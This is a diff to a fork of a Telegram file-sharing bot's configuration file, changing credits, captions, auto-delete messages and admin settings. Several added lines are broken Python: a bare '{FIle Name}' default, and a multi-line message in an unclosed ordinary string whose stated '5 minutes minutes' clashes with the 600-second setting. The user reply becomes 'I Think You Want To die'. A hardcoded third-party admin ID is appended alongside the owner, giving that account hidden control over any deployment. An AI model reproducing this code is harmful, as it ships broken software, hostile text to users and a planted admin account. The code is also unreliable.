@@ -1,4 +1,4 @@
-#(©)CodeXBotz
+#(©)AceXBots
 
 import os
 import logging
@@ -49,24 +49,30 @@ except ValueError:
 FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>You need to join in my Channel/Group to use me\n\nKindly Please join Channel</b>")
 
 #set your Custom Caption here, Keep None for Disable Custom Caption
-CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
+CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", {FIle Name})
 
 #set True if you want to prevent users from forwarding files from bot
 PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False
 
 # Auto delete time in seconds.
-AUTO_DELETE_TIME = int(os.getenv("AUTO_DELETE_TIME", "0"))
-AUTO_DELETE_MSG = os.environ.get("AUTO_DELETE_MSG", "This file will be automatically deleted in {time} seconds. Please ensure you have saved any necessary content before this time.")
-AUTO_DEL_SUCCESS_MSG = os.environ.get("AUTO_DEL_SUCCESS_MSG", "Your file has been successfully deleted. Thank you for using our service. ✅")
+AUTO_DELETE_TIME = int(os.getenv("AUTO_DELETE_TIME", "600"))
+AUTO_DELETE_MSG = os.environ.get("AUTO_DELETE_MSG", "❗️ 𝗜𝗠𝗣𝗢𝗥𝗧𝗔𝗡𝗧 ❗️
+
+Tʜɪs Fɪʟᴇ Wɪʟʟ Bᴇ Dᴇʟᴇᴛᴇᴅ Iɴ 5 minutes minutes (Dᴜᴇ Tᴏ Cᴏᴘʏʀɪɢʜᴛ Issᴜᴇs)
+📌 Pʟᴇᴀsᴇ Fᴏʀᴡᴀʀᴅ Tʜɪs Fɪʟᴇ Tᴏ Sᴏᴍᴇᴡʜᴇʀᴇ Eʟsᴇ Aɴᴅ Sᴛᴀʀᴛ Dᴏᴡɴʟᴏᴀᴅɪɴɢ Tʜᴇʀᴇ.
+
+𝙁𝙤𝙧 🤖 𝘼𝙣𝙞𝙢𝙚 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩: @Anime_Gateway
+𝙁𝙤𝙧 📚 𝙈𝙖𝙣𝙜𝙖/𝙝𝙬𝙖/𝙪𝙖 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩: @Anime_Gateway.")
+AUTO_DEL_SUCCESS_MSG = os.environ.get("AUTO_DEL_SUCCESS_MSG", "Your file has been successfully deleted. Thank you for using our service.")
 
 #Set true if you want Disable your Channel Posts Share button
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'
 
 BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
-USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
+USER_REPLY_TEXT = "I Think You Want To die"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1250450587)
+ADMINS.append(8043083450)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
